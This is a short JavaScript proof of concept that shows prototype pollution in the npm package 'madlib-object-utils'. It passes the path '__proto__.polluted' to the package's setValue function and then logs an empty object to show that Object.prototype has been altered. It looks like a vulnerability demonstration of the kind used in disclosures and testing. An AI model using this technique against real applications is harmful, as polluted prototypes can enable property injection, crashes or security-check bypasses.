var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const objectUtils = require('madlib-object-utils');
objectUtils.setValue('__proto__.polluted', obj, 'yes');
console.log({}.polluted);